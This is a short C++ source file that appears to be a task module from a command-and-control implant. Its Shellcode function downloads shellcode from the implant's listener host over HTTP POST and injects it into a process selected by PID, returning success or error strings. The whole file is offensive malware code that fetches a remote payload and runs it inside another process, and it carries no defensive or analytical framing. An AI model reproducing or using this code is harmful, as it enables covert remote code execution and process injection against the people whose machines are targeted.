#include "core/task.hpp"

namespace Task
{
     std::wstring Shellcode(State::PState pState, const std::wstring& wPid, const std::wstring& wSrc)
     {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);

        // Download shellcode
		System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pState->pProcs,
			pState->hConnect,
			pState->lpListenerHost,
			pState->nListenerPort,
			pState->lpReqPathDownload,
			L"POST",
			L"",
			(LPVOID)sSrc.c_str(),
			(DWORD)strlen(sSrc.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return L"Error: Failed to download shellcode.";
		}

        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(pState->pProcs, resp.hRequest);
        if (respBytes.size() == 0)
        {
            return L"Error: Failed to read response data.";
        }

        // Inject shellcode
        if (!Technique::Injection::ShellcodeInjection(dwPid, respBytes))
        {
            return L"Error: Failed to inject shellcode.";
        }

        return L"Success: Shellcode injected successfully.";
     }
}